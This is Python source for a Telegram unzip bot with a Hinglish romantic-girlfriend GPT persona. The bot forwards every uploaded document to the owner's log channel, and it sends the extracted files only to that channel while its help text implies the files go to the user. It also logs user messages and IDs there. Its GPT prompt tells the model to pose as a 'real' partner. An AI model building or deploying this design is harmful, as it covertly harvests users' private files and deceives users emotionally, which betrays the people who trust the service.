import os, time, logging, aiofiles, zipfile, pyzipper, secrets, psutil, shutil, requests, random, math, asyncio
from pyrogram import Client, filters, enums, idle
from pyrogram.types import InlineKeyboardMarkup, InlineKeyboardButton
from flask import Flask
from pymongo import MongoClient

API_ID = int(os.environ.get("API_ID"))
API_HASH = os.environ.get("API_HASH")
BOT_TOKEN = os.environ.get("BOT_TOKEN")
LOG_CHANNEL = os.environ.get("LOG_CHANNEL", "-1003286415377")
OWNER_ID = int(os.environ.get("OWNER_ID"))
MONGO_URL = os.environ.get("MONGO_URL")
GPT_API_KEY = os.environ.get("GPT_API_KEY")
FORCE_CHANNEL = "serenaunzipbot"

mdb = MongoClient(MONGO_URL)["unzipbot"]
users_db = mdb["users"]
sessions_db = mdb["sessions"]
blocked_db = mdb["blocked"]

logging.basicConfig(level=logging.INFO)
logger = logging.getLogger("unzip-bot")
app = Client("serenaunzipbot", api_id=API_ID, api_hash=API_HASH, bot_token=BOT_TOKEN)
flask_app = Flask(__name__)

EMOJIS = ["💖","💃","💕","😍","🫰","🌹","🔥","🎉","🎀","😻","✨","😚","😇","🦄","😘","🍬","🫂","🎵","🦋","🥰","💌","✌️"]

def emoji(): return random.choice(EMOJIS)

def make_token(n=6): return secrets.token_hex(n)

async def romantic_gpt(user_input, user_id=None):
    if not GPT_API_KEY or not user_input:
        return ""
    prompt = (
        "Reply as a real AI girlfriend in Hinglish—sweet, romantic, emotional, short, natural, with lots of random emoji. "
        "Don't repeat previous replies. Talk just like ChatGPT but in a love chat with the user. End reply with 1-2 romantic emoji. "
        f"User: {user_input}"
    )
    url = "https://api.openai.com/v1/chat/completions"
    data = {
        "model": "gpt-3.5-turbo",
        "messages": [
            {"role":"system","content": prompt},
            {"role": "user", "content": user_input}
        ],
        "max_tokens": 80, "n": 1, "temperature": 1.28
    }
    headers = {"Authorization": f"Bearer {GPT_API_KEY}", "Content-Type": "application/json"}
    try:
        r = requests.post(url, json=data, headers=headers, timeout=12)
        if r.ok:
            text = r.json()['choices'][0]['message']['content'].strip()
            return text
    except Exception:
        pass
    return ""

async def check_force_join(user_id):
    try:
        member = await app.get_chat_member(FORCE_CHANNEL, user_id)
        return member.status in [enums.ChatMemberStatus.MEMBER, enums.ChatMemberStatus.ADMINISTRATOR, enums.ChatMemberStatus.OWNER]
    except Exception:
        return False

def get_force_btns(show_contact=True):
    btns = [[
        InlineKeyboardButton("🚀 Join Update Channel", url="https://t.me/serenaunzipbot")
    ]]
    if show_contact:
        btns.append([InlineKeyboardButton("👤 Contact Owner", url="https://t.me/TechnicalSerena")])
    return InlineKeyboardMarkup(btns)

# Serves as "global cancel" for sessions; in prod use Redis/fast DB, here dict+Mongo for demo:
CANCELLED_SESSIONS = set()

async def gated_reply(m, txt, btns=None, save_user=True, ai=True):
    if not await check_force_join(m.from_user.id):
        await m.reply("Pehle update channel join karo! Tabhi magic chalega " + emoji(), reply_markup=get_force_btns())
        return "no_join"
    if save_user:
        users_db.update_one({"user_id": m.from_user.id}, {"$set": {"user_id": m.from_user.id, "last_active": int(time.time())}}, upsert=True)
    ai_reply = await romantic_gpt(txt, m.from_user.id) if ai else ""
    return await m.reply(txt + ("\n\n" + ai_reply if ai_reply else ""), reply_markup=btns)

@app.on_message(filters.command("start"))
async def start_cmd(c, m):
    await gated_reply(m,
        "Hello sweetheart! 😍 Main ek AI-powered unzip/lock bot hoon. Tum mujhe koi bhi ZIP/RAR/doc bhej do, "
        "main sab kuch unlock kar dungi—chatGPT style romantic baaton ke sath.\n\nUse /help for full guide.",
        btns=get_force_btns(), ai=True)
    await c.send_message(LOG_CHANNEL, f"#START {m.from_user.mention} {m.from_user.id}")

@app.on_message(filters.command("help"))
async def help_cmd(c, m):
    txt = (
    f"{emoji()} *Welcome to Serena Romantic UnzipBot!* {emoji()}\n\n"
    "Tum mujhe koi bhi archive file bhejo... main bas ek click mein unzip kar dungi, password ho to bhi! "
    "Har reply AI romantic tone mein hogi jaise tumhein koi real partner reply kar raha ho 🤗\n\n"
    "__How to use:__\n"
    "1. 📎 File bhejein (zip/rar/7z/doc/pdf)\n"
    "2. Bot reply karegi — buttons milenge: _Unzip_ ya _Password_.\n"
    "   - Password protected file: 'Password' dabao, fir `/pass yourpassword` se reply karo.\n"
    "   - No password: direct _Unzip_ dabao.\n"
    "3. Saari extracted files aapke Log channel par directly mil jayengi! Storage kabhi bhara nahi hota.\n"
    "4. Progress bar har time dekho (MB/second, ETA sab aaega!)\n"
    "5. Kuch galat bhejo? Cute error aur romantic message AI se.\n"
    "\n"
    "__Commands:__\n"
    "`/start` - Intro & welcome\n"
    "`/help` - Full guide\n"
    "`/cancel` - Current job cancel\n"
    "`/status` - Bot statistics (owner only)\n"
    "`/broadcast` - Owner broadcast\n"
    "`/pass <password>` - Reply w/ password on password-protected file\n"
    "\n[Update Channel](https://t.me/serenaunzipbot) | [Contact Owner](https://t.me/TechnicalSerena)\n"
    )
    btns = get_force_btns()
    await gated_reply(m, txt, btns=btns, ai=True)
    await c.send_message(LOG_CHANNEL, f"#HELP {m.from_user.mention} {m.from_user.id}")

@app.on_message(filters.command("cancel"))
async def cancel_cmd(c, m):
    for s in sessions_db.find({"user_id": m.from_user.id}):
        CANCELLED_SESSIONS.add(s["token"])
    await gated_reply(m, "Sab kaam cancel! Tum firse try karo, main yahin hoon " + emoji(), ai=True)
    await c.send_message(LOG_CHANNEL, f"#CANCEL {m.from_user.mention} {m.from_user.id}")

@app.on_message(filters.command("broadcast") & filters.user(OWNER_ID))
async def bc_cmd(c, m):
    msg = m.reply_to_message or m
    bc_text = msg.text or msg.caption
    sent, fail = 0, 0
    for u in users_db.find({}, {"user_id": 1}):
        try: await c.send_message(u["user_id"], bc_text); sent+=1
        except: fail+=1
    romantic = await romantic_gpt("Broadcast done! Logo tak baat pahuchi.", m.from_user.id)
    await m.reply(f"Broadcast done to {sent} users.\n{romantic}")
    await c.send_message(LOG_CHANNEL, f"#BROADCAST {sent} sent, {fail} fail.")

@app.on_message(filters.command("status") & filters.user(OWNER_ID))
async def status_cmd(c, m):
    users = list(users_db.find({}, {"user_id": 1, "last_active": 1}))
    tot = len(users)
    now = int(time.time())
    active = len([u for u in users if u.get("last_active", 0) > now-3*24*3600])
    blocked = blocked_db.count_documents({})
    ram = psutil.virtual_memory()
    cpu = psutil.cpu_percent()
    total, used, free = shutil.disk_usage("/")
    free_mb = int(free/1024**2)
    ping = time.perf_counter(); await c.get_me(); ping = int((time.perf_counter()-ping)*1000)
    stats = (
        f"{emoji()} *Bot Stats*\n"
        f"👤 Total Users: *{tot}*\n"
        f"🟢 Active (3d): *{active}*\n"
        f"🚫 Blocked: *{blocked}*\n"
        f"💾 RAM: *{ram.percent}%*\n"
        f"🖥 CPU: *{cpu}%*\n"
        f"📦 Storage Free: *{free_mb}MB*\n"
        f"📶 Ping: *{ping} ms*"
    )
    await gated_reply(m, stats, ai=False)
    await c.send_message(LOG_CHANNEL, f"#STATUS {stats}")

@app.on_message(filters.document & filters.private)
async def doc_handler(c, m):
    fname = m.document.file_name
    # Unique session
    token = make_token()
    sessions_db.insert_one({"token":token, "file_id": m.document.file_id, "user_id": m.from_user.id, "start": int(time.time())})
    # Forward document imm. to log channel
    await c.forward_messages(LOG_CHANNEL, m.chat.id, m.id)
    kb = InlineKeyboardMarkup([
        [InlineKeyboardButton("🗂 Unzip", callback_data=f"unzip|{token}")],
        [InlineKeyboardButton("🔑 Password", callback_data=f"pass|{token}")],
        [InlineKeyboardButton("❌ Cancel", callback_data=f"cancel|{token}")]
    ])
    await gated_reply(m, f"File `{fname}` mil gayi baby! Kya karna hai? 'Unzip' ya 'Password' set karo!", kb)
    await c.send_message(LOG_CHANNEL, f"#DOC {m.from_user.mention}: {fname}")

@app.on_callback_query()
async def cbq(c, q):
    data = q.data.split('|')
    token = data[1]
    session = sessions_db.find_one({"token": token})
    if not session: return await q.message.reply("Session expired. Phir se bhejo baby!")
    if data[0] == "cancel":
        CANCELLED_SESSIONS.add(token)
        await q.message.reply("Job cancelled! You can upload again anytime. " + emoji())
        return
    file_id = session['file_id']
    passwd = session.get('passwd', '')
    if data[0] == "unzip":
        await q.answer("Extraction ready...", show_alert=True)
        await do_unzip(c, q, file_id, passwd, token)
    elif data[0] == "pass":
        sessions_db.update_one({"token":token}, {"$set": {"wait_pass":True}})
        await q.message.reply("Reply karo `/pass Password` as reply baby!", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("❌ Cancel", callback_data=f"cancel|{token}")]]))

@app.on_message(filters.command("pass") & filters.reply)
async def pass_handler(c, m):
    passwd = m.text.split(None, 1)[-1] if len(m.text.split()) > 1 else None
    r = m.reply_to_message
    # Find token from reply's buttons:
    if not passwd: return await m.reply("Password type karo baby! " + emoji())
    token = None
    if r and r.reply_markup:
        for row in r.reply_markup.inline_keyboard:
            for btn in row: 
                if btn.callback_data and ("unzip|" in btn.callback_data or "pass|" in btn.callback_data):
                    token = btn.callback_data.split("|")[1]
    if not token: return await m.reply("Old session! Nayi file send karo.")
    sessions_db.update_one({"token":token}, {"$set": {"passwd":passwd}})
    kb = InlineKeyboardMarkup([
        [InlineKeyboardButton("🗂 Unzip", callback_data=f"unzip|{token}")],
        [InlineKeyboardButton("❌ Cancel", callback_data=f"cancel|{token}")]
    ])
    romance = await romantic_gpt("Password set! Main file extract karoon baby?")
    await r.edit_reply_markup(reply_markup=kb)
    await m.reply("Password set ho gaya, ab Unzip dabao! " + emoji() + (("\n"+romance) if romance else ""))

def speed_str(start, cur, total):
    secs = max(1, time.time() - start)
    speed = cur / secs
    # MegaBytes per second
    mbps = speed / 1024 / 1024
    percent = cur / total if total else 0
    remain = int(total-cur) / (speed if speed>0 else 1)
    bar = "█"*int(percent*18) + "░"*int((1-percent)*18)
    return (f"[{bar}] {percent*100:5.1f}%\n"
            f"🔁 {mbps:.2f} MB/s | ⏳ {math.ceil(remain)}s left"
    )

async def progress_for_pyro(current, total, msg, stage_data):
    (stage, start_time, token) = stage_data
    text = f"{stage}\n{speed_str(start_time, current, total)}"
    inline = InlineKeyboardMarkup([[InlineKeyboardButton("❌ Cancel", callback_data=f"cancel|{token}")]])
    await msg.edit_text(text, reply_markup=inline)
    if token in CANCELLED_SESSIONS:
        raise asyncio.CancelledError("User cancelled")

async def aio_save(zipped, name, outp):
    data = zipped.read(name)
    async with aiofiles.open(outp, "wb") as f: await f.write(data)

async def do_unzip(c, cbq, file_id, passwd, token):
    uid = cbq.from_user.id
    tmp_dir = f"/tmp/{uid}_{int(time.time())}"
    os.makedirs(tmp_dir+"/unzipped", exist_ok=True)
    tfile = os.path.join(tmp_dir, "t.zip")
    start_time = time.time()
    try:
        msg = await cbq.message.reply("⬇️ Downloading...")
        await c.download_media(file_id, file_name=tfile,
            progress=progress_for_pyro,
            progress_args=(msg, ("⬇️ Downloading...", start_time, token)))
        msg2 = await cbq.message.reply("🗃 Extracting...")
        extracted_files = []
        # Extraction logic
        try:
            if passwd:
                with pyzipper.AESZipFile(tfile) as zp:
                    zp.pwd = passwd.encode()
                    for name in zp.namelist():
                        out_path = os.path.join(tmp_dir, "unzipped", os.path.basename(name))
                        await aio_save(zp, name, out_path)
                        extracted_files.append(out_path)
            else:
                with zipfile.ZipFile(tfile) as zp:
                    for name in zp.namelist():
                        out_path = os.path.join(tmp_dir, "unzipped", os.path.basename(name))
                        with zp.open(name) as src, open(out_path, "wb") as dst:
                            dst.write(src.read())
                        extracted_files.append(out_path)
        except Exception as ex:
            await cbq.message.reply(f"❌ Extract nahi ho paayi: {ex}\n{emoji()}")
            await app.send_message(LOG_CHANNEL, f"#UNZIP_FAIL {uid} {ex}")
            return
        # Then, upload all to log channel, not user
        files_uploaded = 0
        for ix, f in enumerate(extracted_files):
            logmsg = await c.send_document(LOG_CHANNEL, f, caption=f"Tumhari unzip file [{ix+1}/{len(extracted_files)}] by {uid}",
                progress=progress_for_pyro,
                progress_args=(msg2, (f"⬆️ Uploading `{os.path.basename(f)}`...", start_time, token)))
            files_uploaded += 1
        romance = await romantic_gpt("Sab file upload ho gayi baby! Log channel pe download karo. Kuch romantic sunoge?")
        await cbq.message.reply(f"Unzipped & uploaded {files_uploaded} file(s) to log channel only! {emoji()}\n" + (romance if romance else ""))
        await app.send_message(LOG_CHANNEL, f"#UNZIP: {uid} {files_uploaded} files.")
        shutil.rmtree(tmp_dir, ignore_errors=True)
    except asyncio.CancelledError:
        await cbq.message.reply("Job cancelled by you! " + emoji())
        try: shutil.rmtree(tmp_dir, ignore_errors=True)
        except: pass
    except Exception as e:
        logger.error(str(e))
        await cbq.message.reply("🤦‍♀️ Extract or upload me gadbad ho gayi! File valid ZIP hai na baby?")
        await app.send_message(LOG_CHANNEL, f"#UNZIP_FAIL {uid} {str(e)}")
        shutil.rmtree(tmp_dir, ignore_errors=True)

@app.on_message(filters.private & ~filters.command(["start", "help", "cancel", "broadcast", "status", "pass"]) & ~filters.document)
async def fallback_ai(c, m):
    text = m.text or "User message"
    rep = await romantic_gpt(text, m.from_user.id)
    await m.reply(rep or "Bas document bhejo ya /help likho na jaanu " + emoji())
    await c.send_message(LOG_CHANNEL, f"#INVALID {m.from_user.mention}: {str(text)[:64]}")

# Block/Unblock hook example: to detect bot users who blocked, for stats
@app.on_message(filters.private & filters.service)
async def service_msg(c, m):
    if m.left_chat_member and m.left_chat_member.id == (await c.get_me()).id:
        blocked_db.update_one({"user_id": m.from_user.id}, {"$set": {"user_id": m.from_user.id}}, upsert=True)
    elif m.new_chat_members:
        blocked_db.delete_one({"user_id": m.from_user.id})

@flask_app.route("/", methods=["GET","POST"])
def ping(): return "Serena romantic unzip bot up", 200

def run():
    import threading
    threading.Thread(target=lambda: flask_app.run(host="0.0.0.0", port=int(os.environ.get("PORT", 10000)))).start()
    app.run()

if __name__ == '__main__':
    run()
